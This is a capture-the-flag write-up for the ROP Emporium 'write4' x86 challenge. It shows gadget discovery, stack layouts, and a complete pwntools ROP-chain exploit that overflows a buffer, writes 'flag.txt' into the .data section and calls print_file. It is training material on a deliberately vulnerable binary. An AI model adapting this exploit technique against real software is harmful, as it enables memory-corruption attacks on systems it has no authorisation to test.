# GIST
The goal of this exercise is to create a slightly more advanced ROP chain, using ROP gadgets to inject data into memory using the stack, and then pass those values as arguments into a function call.

# Link
Read about it [here](https://ropemporium.com/challenge/write4.html)




# Identifying and Analyzing Functions
First, let's look at functions imported from shared libraries:

	rabin2 -i write432

	[Imports]
	nth vaddr      bind   type   lib name
	―――――――――――――――――――――――――――――――――――――
	1   0x080483b0 GLOBAL FUNC       pwnme
	2   0x00000000 WEAK   NOTYPE     __gmon_start__
	3   0x080483c0 GLOBAL FUNC       __libc_start_main
	4   0x080483d0 GLOBAL FUNC       print_file

Now, let's look at innate functions: 
	
	rabin2 -qs write432 | grep -ve imp -e ' 0 '

	0x080485cc 4 _IO_stdin_used
	0x0804a020 1 completed.7283
	0x0804852a 25 usefulFunction
	0x080485b0 2 __libc_csu_fini
	0x08048440 4 __x86.get_pc_thunk.bx
	0x08048550 93 __libc_csu_init
	0x08048430 2 _dl_relocate_static_pie
	0x080485c8 4 _fp_hw
	0x08048506 36 main

Let's also use pwntools to see if there are any functions that we haven't identified with these 2 commands:

	from pwn import *
	from pprint import pprint
	offset = 40
	
	context.arch = 'i386'
	
	elf = ELF("./write432")
	p = elf.process()
	
	# let's print allll the functions
	pprint(elf.symbols)
	~                                                                                                              
	~                                                                                                              
	"pwny1.py" 12L, 178C written

With this, we have identified another function called usefulGadgets :)

	$ python3 pwny1.py
	[+] Starting local process '/home/ubuntu/ropemporium/write4/write432': pid 19958
	{'': 134520864,
	...
	 'usefulGadgets': 134513987}
	[*] Stopped process '/home/ubuntu/ropemporium/write4/write432' (pid 19958)


	
So, looks like pwnme function is *imported* this time, from the libwrite432.so library.
This means "pwnme" won't be at a static place in memory, as it is dynamically loaded into a random address each time the program is ran... We can confirm this with ldd:

	$ ldd write432 
	linux-gate.so.1 (0xf7f75000)
	libwrite432.so => ./libwrite432.so (0xf7f6c000)
	libc.so.6 => /lib32/libc.so.6 (0xf7d6d000)
	/lib/ld-linux.so.2 (0xf7f77000)
	

So, let's look at what usefulFunction does... 

	gef➤  disass usefulFunction
	Dump of assembler code for function usefulFunction:
	   0x0804852a <+0>:	push   ebp
	   0x0804852b <+1>:	mov    ebp,esp
	   0x0804852d <+3>:	sub    esp,0x8
	   0x08048530 <+6>:	sub    esp,0xc
	   0x08048533 <+9>:	push   0x80485d0
	   0x08048538 <+14>:	call   0x80483d0 <print_file@plt>
	   0x0804853d <+19>:	add    esp,0x10
	   0x08048540 <+22>:	nop
	   0x08048541 <+23>:	leave  
	   0x08048542 <+24>:	ret    
	End of assembler dump.

Looks like it sets up the stack, then makes a call to the function "print_file".

This function tries to open file by name, but "nonexistent" is passed as an argument. We can see that it fails because of this.

	gef➤  run < input_uf
	Starting program: /home/ubuntu/ropemporium/write4/write432 < input_uf
	write4 by ROP Emporium
	x86
	
	Go ahead and give me the input already!
	
	> Thank you!
	Failed to open file: nonexistent
	[Inferior 1 (process 18808) exited with code 01]

# Writing to Memory

So, we know that we want to use ROP to change the arguments that are on the stack when the "print_file" function is called. With the previous challenges we were able to leverage "usefulString" to open the file that we wanted, but in this case, there is no "usefulString" in memory... :'(

We need to write a string to memory.
We need to use a ROPgadget to do this.

This article is a pretty good reference if you're following along: [ROP FTW](https://www.exploit-db.com/docs/english/28479-return-oriented-programming-(rop-ftw).pdf)

After a bit of reading, looks like we should look at what sections are writeable...

Looks like we can write to the data section:

	$ readelf -S write432  | grep data
	  [16] .rodata           PROGBITS        080485c8 0005c8 000014 00   A  0   0  4
	  [24] .data             PROGBITS        0804a018 001018 000008 00  WA  0   0  4


Let's locate it in memory:

	$ !! | grep data
	readelf -s write432 | grep data
	     5: 0804a020     0 NOTYPE  GLOBAL DEFAULT   24 _edata
	    50: 0804a018     0 NOTYPE  WEAK   DEFAULT   24 data_start
	    51: 0804a020     0 NOTYPE  GLOBAL DEFAULT   24 _edata
	    53: 0804a018     0 NOTYPE  GLOBAL DEFAULT   24 __data_start

We can also do this using mmap in gdb:

	gef➤  info files
	Symbols from "/home/ubuntu/ropemporium/write4/write432".
	Native process:
		Using the running image of child process 18967.
		While running this, GDB does not access memory from...
	Local exec file:
		`/home/ubuntu/ropemporium/write4/write432', file type elf32-i386.
		Entry point: 0x80483f0
		...
		0x0804a018 - 0x0804a020 is .data
		...	
	
So we have 8 Bytes of data that we can write to in the .data section, which starts at 0x0804a018 and ends at 0x0804a01c.
Flag.txt is 8 Bytes, so we shouldddd be able to fit that into the data section.

# Choosing Gadgets 

Okay, let's look at some of the ROP gadgets...
These are some of the relevant gadgets: 

	$ ROPgadget --binary write432
	0x08048472 : add esp, 0x10 ; leave ; ret
	0x0804853d : add esp, 0x10 ; nop ; leave ; ret
	
	0x080485a5 : add esp, 0xc ; pop ebx ; pop esi ; pop edi ; pop ebp ; ret
	0x08048521 : add esp, 4 ; pop ecx ; pop ebp ; lea esp, [ecx - 4] ; ret
	0x0804839a : add esp, 8 ; pop ebx ; ret
	x08048479 : lea edi, [edi] ; ret
	0x080484c4 : lea esi, [esi] ; ret
	0x08048526 : lea esp, [ecx - 4] ; ret
	
	0x08048475 : leave ; ret
	0x08048543 : mov dword ptr [edi], ebp ; ret		== usefulGadget :)
	0x08048423 : mov ebx, dword ptr [esp] ; ret
	0x0804843f : nop ; mov ebx, dword ptr [esp] ; ret
	0x08048525 : pop ebp ; lea esp, [ecx - 4] ; ret
	0x080485ab : pop ebp ; ret
	0x080485a8 : pop ebx ; pop esi ; pop edi ; pop ebp ; ret
	0x0804839d : pop ebx ; ret
	0x08048524 : pop ecx ; pop ebp ; lea esp, [ecx - 4] ; ret
	0x080485aa : pop edi ; pop ebp ; ret
	0x080485a9 : pop esi ; pop edi ; pop ebp ; ret
	0x08048421 : push esp ; mov ebx, dword ptr [esp] ; ret
	
	0x08048525 : pop ebp ; lea esp, [ecx - 4] ; ret
	0x080485ab : pop ebp ; ret
	0x080485a8 : pop ebx ; pop esi ; pop edi ; pop ebp ; ret
	0x0804839d : pop ebx ; ret
	0x08048524 : pop ecx ; pop ebp ; lea esp, [ecx - 4] ; ret
	0x080485aa : pop edi ; pop ebp ; ret
	0x080485a9 : pop esi ; pop edi ; pop ebp ; ret
	...
	Unique gadgets found: 126


Memory addresses we want to write to =  0x0804a018 and 0x0804a01c
What we want to write: "flag" and ".txt"

So if we use usefulGadget (mov DWORD PTR [edi], ebp; ret;), then:
\*edi = fake ebp

But, we want to control this edi value!

We can do this by popping a value off of the stack, and into edi:)

	0x080485aa : pop edi ; pop ebp ; ret

With both of these ROP gadgets, we can set up the stack so that we can pop a value into edi, and a value into ebp. We can then return the next ROP gadget (usefulGadgets), which will move the value of ebp into the address that edi points to. In other words (speaketh C?):

	edi = <address in data section>
	ebp = "flag"
	*edi = ebp = "flag"


# Stack 1

So let's set up the stack accordingly:

	A's                                     40B
	_______________________________________
	fake ebp
	 = BBBB                                  4B
	_______________________________________
	eip  
 	 = address of ROP gadget
	 = &ROP gadget ("&" = "address of")	
	 = 0x080485aa
	 = "\xaa\x85\x04\x08"
	_______________________________________
	edi 
	 = &data
	 = 0x0804a018
	 = "\x18\xa0\x04\x08"
	_______________________________________
	ebp 
	 = "flag"
	_______________________________________
	eip = &uG
	 = 0x08048543 
	 = "\x43\x85\x04\x08"
	________________________________________
	eip = whatever
	 = cccc 
	_______________________________________
	
I set this up in a .txt file using "echo -e"... This helps me have more granular control over the values that I am passing into the program. Also, I am a n00b.

Me using echo -e:

	$ echo -e "`python3 -c "print('a'*40+'b'*4)"`\xaa\x85\x04\x08\x18\xa0\x04\x08flag\x43\x85\x04\x08cccc" > input


Let's run it in gdb and see if our values are correct:

	gef➤  i r edi
	edi            0x804a018           0x804a018
	gef➤  x/wx $edi
	0x804a018:	0x67616c66
	gef➤  x/s $edi
	0x804a018:	"flag"
	

Okay, so this worked pretty nicely :) we now have "flag" stored at .data (0x0804a018)


# Stack 2 - Storing the Entire String in Memory

Now, we need to get ".txt" into .data+0x4 (0x0804a01c)
Can we use the same ROP gadgets??

	A's                                     40B
	_______________________________________
	fake ebp
	 = BBBB                                  4B
	_______________________________________
	eip
	 = &ROP gadget
	 = 0x080485aa				 4B 
 	 = "\xaa\x85\x04\x08"
	 _______________________________________
	edi 
	 = &data
	 = 0x0804a018				 4B
	 = "\x18\xa0\x04\x08"
	_______________________________________
	ebp 
	 = "flag"				 4B
	_______________________________________
	eip = &uG
	 = 0x08048543 				 4B
	 = "\x43\x85\x04\x08"
	________________________________________
	 eip = &ROP gadget
	 = 0x080485aa				 4B
	 = "\xaa\x85\x04\x08"
	_______________________________________
	edi 
	 = &data
	 = 0x0804a01c				 4B
	 = "\x1c\xa0\x04\x08"
	_______________________________________
	ebp
	 = ".txt"				 4B
	_______________________________________
	eip = &usefulGadget
	 = 0x08048543 
	 = "\x43\x85\x04\x08"			 4B
	_______________________________________
	eip  
	 = 0x080485aa
	 = cccc 
	_______________________________________



Looks like we can :D. 

	gef➤  i r edi
	edi            0x804a01c           0x804a01c
	gef➤  x/s $edi
	0x804a01c:	".txt"
	
Okay, so we succesfully have put ".txt" at .data+0x4 (edi register) :)


# Passing Arguments to Our Function

We now have put our string in memory! It is located at &data_start, or in other words, the start of the .data section header in our program :)
So, now we set up the stack so that it has those addresses on it, which will be arguments passed into the print_file function:


	A's                                     40B
	_______________________________________
	fake ebp
	 = BBBB                                  4B
	_______________________________________
	eip
	 = &ROP gadget
	 = 0x080485aa				 4B
	 = "\xaa\x85\x04\x08"
	_______________________________________
	edi 
	 = &data
	 = 0x0804a018				 4B
	 = "\x18\xa0\x04\x08"
	_______________________________________
	ebp 
	 = "flag"				 4B
	_______________________________________
	eip = &usefulGadget
	 = 0x08048543 				 4B
	 = "\x43\x85\x04\x08"
	________________________________________
	eip = &ROP gadget
	 = 0x080485aa				 4B
	 = "\xaa\x85\x04\x08"
	_______________________________________
	edi 
	 = &data + 0x4
	 = 0x0804a01c				 4B
	 = "\x1c\xa0\x04\x08"
	_______________________________________
	ebp 
	 = ".txt"				 4B
	_______________________________________
	eip = &usefulGadget
	 = 0x08048543 				 4B
	 = "\x43\x85\x04\x08"
	_______________________________________
	eip  
	 = &print_file
	 = 0x080483d0				 4B
	 =  "\xd0\x83\x04\x08"
	_______________________________________
	fake eip
	 = "dddd"				 4B
	_______________________________________
	args
	 = &data
	 = 0x0804a018				 4B
	 = "\x18\xa0\x04\x08"
	_______________________________________
	

# FTW

O hek yea

	$ ./write432  < input 
	write4 by ROP Emporium
	x86
	
	Go ahead and give me the input already!
	
	> Thank you!
	ROPE{i ate the bug}
	
	Segmentation fault (core dumped)
	

Now that I have endured a bit of masochism by manually creating my input file, I can whip up a python script that should work as well:

(it does):

	$ python3 write432.py
	[*] '/home/ubuntu/ropemporium/write4/write432'
	    Arch:     i386-32-little
	    RELRO:    Partial RELRO
	    Stack:    No canary found
	    NX:       NX enabled
	    PIE:      No PIE (0x8048000)
	    RUNPATH:  b'.'
	[+] Starting local process '/home/ubuntu/ropemporium/write4/write432': pid 22583
	b'write4 by ROP Emporium\nx86\n\nGo ahead and give me the input already!\n\n>'
	[*] Loaded 10 cached gadgets for './write432'
	rop gadget 1 is at:  b'\xaa\x85\x04\x08'
	payload is:  b'AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABBBB\xaa\x85\x04\x08\x18\xa0\x04\x08flagC\x85\x04\x08\xaa\x85\x04\x08\x1c\xa0\x04\x08.txtC\x85\x04\x08\xd0\x83\x04\x08dddd\x18\xa0\x04\x08'
	[+] Receiving all data: Done (33B)
	[\*] Process '/home/ubuntu/ropemporium/write4/write432' stopped with exit code -11 (SIGSEGV) (pid 22583)
	b' Thank you!\nROPE{i ate the bug}\n\n'


Here's what it looks like:

	$ cat write432.py
	
	from pwn import *
	from pprint import pprint
	offset = 40
	
	context.arch = 'i386'
	
	elf = ELF("./write432")
	p = elf.process()
	
	
	print(p.recvuntil(b">"))
	# let's first determine where everything is:
	# pprint(elf.symbols)
	
	# let's print out some addresses and double-check with gdb 
	#   print("data start:", p32(elf.symbols["data_start"]))
	#   print("useful gagdets is at: ", p32(elf.symbols["usefulGadgets"]))
	#   print("print_file@plt is located at: " , p32(elf.symbols["plt.print_file"]))
	#   print("print_file is located at: " , p32(elf.symbols["print_file"]))
	
	
	# Crafting variable for our payload :)
	
	# use rop object to locate gadgets in memory
	rop = ROP(elf)
	
	# buffer is 40 A's
	buf = b"A"*offset
	
	# fake ebp
	fake_ebp = b"BBBB"
	
	# printint out rop gadget to make sure that it reads: "pop edi ; pop ebp ; ret"
	print("rop gadget 1 is at: ", p32(rop.edi.address))
	
	# it does, so put it into a variable for our payload
	rop_gadget1_addr =  p32(rop.edi.address)
	
	# locate the start of the .data section header 
	data_addr = p32(elf.symbols["data_start"])
	
	# first value we're popping is edi... since we want *edi = ebp = "flag", set edi to .data address
	# this is because we're writing the string "flag" to memory starting at the .data section
	edi = data_addr
	
	# ebp = "flag"
	ebp = b"flag"
	
	# get addr of usefulGadget, our second ROP gadget
	useful_Gadget_addr = p32(elf.symbols["usefulGadgets"]) 
	
	#rop_gadget1_addr stays same, because we will still be using that first ROP gadget to pop edi and ebp
	
	#edi is now data_addr + 0x4, since we are writing 4 more Bytes, and this is a 32-bit process
	edi2 = p32(elf.symbols["data_start"] + 4)
	
	#ebp is now ".txt":
	ebp2 = b".txt"
	
	# get the address of the print_file function--this is our final function that we are leveraging in order to open the "flag.txt" file
	print_file_addr = p32(elf.symbols["plt.print_file"])
	
	# when the program calls print_file, the stack should have an eip at the top (at lower memory address), then arguments below it (at higher memory addresses)... this eip is necessary so that the print_file function knows where to return to after opening our file. However, it is even more important for stack offsets. The program is going to use ebp indexing to determine where its arguments are. It'll expect a value at eip, even though eip isn't properly used and causes a segfault. 
	fake_eip = b"dddd"
	
	# our arguments 
	args = data_addr
	
	payload = [
	        buf,                    #bunch of A's
	        fake_ebp,               # BBBB
	        rop_gadget1_addr,       # addr of "pop edi; pop ebp; ret;"
	        edi,                    # addr of start of .data section header
	        ebp,                    # "flag"
	        useful_Gadget_addr,     # addr of useful gadget = mov [edi], ebp
	        rop_gadget1_addr,       # addr of "pop edi; pop ebp; ret;"
	        edi2,                   # addr of start of .data section header + 0x4
	        ebp2,                   # ".txt"
	        useful_Gadget_addr,     # addr of useful gadget = mov [edi], ebp
	        print_file_addr,        # addr of print_file in usefulFunction
	        fake_eip,               # addr of fake eip = "dddd"
	        args                    # arguments for print_file fxn = address of .data section header
	        ]
	
	payload = b"".join(payload)
	print("payload is: ", payload)
	
	p.send(payload)
	
	
	print(p.recvall())
	p.close()
